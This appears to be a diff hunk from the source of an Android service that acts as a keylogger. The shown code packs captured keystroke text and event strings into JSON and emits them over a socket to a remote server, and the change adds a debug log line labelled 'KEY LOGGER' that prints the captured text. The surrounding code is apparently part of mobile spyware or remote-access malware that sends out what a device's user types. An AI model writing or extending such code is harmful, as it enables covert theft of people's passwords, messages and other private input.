@@ -525,6 +525,7 @@ public class Server extends Service {
             sendJson.put("keylogs", text);
             sendJson.put("event", eventString);
             if(socket != null && socket.connected()) {
+                Log.d("KEY LOGGER::", text + ":::" + eventString);
                 socket.emit("key-logs-mobile-response", sendJson);
             }
         } catch (Exception e) {
